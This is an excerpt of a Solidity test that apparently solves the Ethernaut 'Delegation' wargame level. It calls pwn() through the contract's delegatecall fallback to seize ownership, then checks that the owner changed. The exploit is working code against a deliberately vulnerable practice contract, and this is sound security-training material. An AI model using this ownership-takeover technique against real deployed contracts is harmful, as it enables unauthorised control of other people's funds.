...
contract DelegationTest is DSTest {
    ...
    function testDelegationHack() public {
        ...
        // assertEq(ethernautDelegation.owner(), tx.origin);
        emit log_named_address("Contract owner", ethernautDelegation.owner());
        address(ethernautDelegation).call(abi.encodeWithSignature("pwn()"));
        assertEq(ethernautDelegation.owner(), msg.sender);
        emit log_named_address("Contract owner", ethernautDelegation.owner());
